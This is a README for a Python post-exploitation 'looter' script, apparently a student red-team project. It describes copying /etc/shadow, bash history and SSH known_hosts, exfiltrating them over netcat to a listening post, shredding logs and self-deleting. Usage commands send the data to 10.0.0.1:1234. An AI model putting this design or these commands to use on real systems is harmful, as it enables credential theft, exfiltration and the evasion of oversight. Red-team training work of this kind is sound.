#Module 1 - looter.py 
##Idea
On the 842 Ideas Spreadsheet, Andrew Kramer suggested the idea of creating an automated looting script that will collect relevant data for someone who gained root access to a box.  This is great for red team exercises where the attacker wants to be able to quickly grab useful files and data before getting booted off the system.

##Purpose
This script will crawl through a box and quickly collect useful information for an attacker.  The script will determine which OS it is on to ensure compatibility before attempting to collect anything.  The nest egg (collection stash) location will be in the present working directory of the script unless specified by the user.

This script makes an attempt is made to copy relevant files including but not limited to /etc/passwd, /etc/shadow, ~/.bash_history, known_hosts etc to the nest egg location.  Once everything is collected, the files are prepared and zipped for exfiltration.  Currently, the script uses netcat to create a network connection to a listening post for exfiltration.

The goal is to be discreet and the script will shred logs, avoid writing to bash_history, and cover its own tracks after performing collections.

This Python script has been tested on Kali Linux 64 bit with Python 2.7.12.

##Help Screen 
```
usage: looter.py [-h] [-a] [-ne] [-d PATH] [-t TARGET] [-p PORT] [-r]

Looter script, collects juicy data for malicious use.

optional arguments:
  -h, --help            show this help message and exit
  -a, --all             perform all collections
  -ne, --noexfil        disable exfil feature, drop tar file in dir
  -d PATH, --dir PATH   specify nest egg path
  -t TARGET, --target TARGET 
  						specify exfil ip address (IPv4 only)
  -p PORT, --port PORT  specify exfil port number
  -r, --remove          remove script after execution
```
##Usage Examples

A collection without any exfiltration can be done with the command below:

```
python ./looter.py -a -ne
```

A collection with exfiltration to a specified IP address and port can be done with the command below:

```
python ./looter.py -a -t 10.0.0.1 -p 1234
```

Specifying the -r flag will cause the script to be destroyed after execution to cover its tracks:

```
python ./looter.py -a -t 10.0.0.1 -p 1234 -r
````

Specifying the -d flag with a valid path will change the default nest egg location:
```
python ./looter.py -a -t 10.0.0.1 -p 1234 -d ~/Desktop/
```

##Known Issues
* Random bug where user specified path sometimes causes zipping to fail
* Not sure how "discreet" the script is yet, plenty of room for improvement

##Future Work
* Continue to expand list of useful / interesting files to capture
* Search ssh known_hosts file and attempt to log into entries
* Dump any databases into a file
* Run a quick internal network scan and output into a file

##Long Term Goals
* Attempt privilege escalation
* Attempt to install a basic backdoor
* Provide OS compatibility across OSX, Windows, and *nix

##Resources
https://pymotw.com/2/argparse/

http://stackoverflow.com/questions/3718657/how-to-properly-determine-current-script-directory-in-python

http://stackoverflow.com/questions/110362/how-can-i-find-the-current-os-in-python

http://stackoverflow.com/questions/2032403/how-to-create-full-compressed-tar-file-using-python

http://stackoverflow.com/questions/4417546/constantly-print-subprocess-output-while-process-is-running

https://docs.python.org/2/library/os.path.html#os.path.basename

http://stackoverflow.com/questions/29065781/how-can-i-get-a-python-program-to-kill-itself-using-a-command-run-through-the-mo

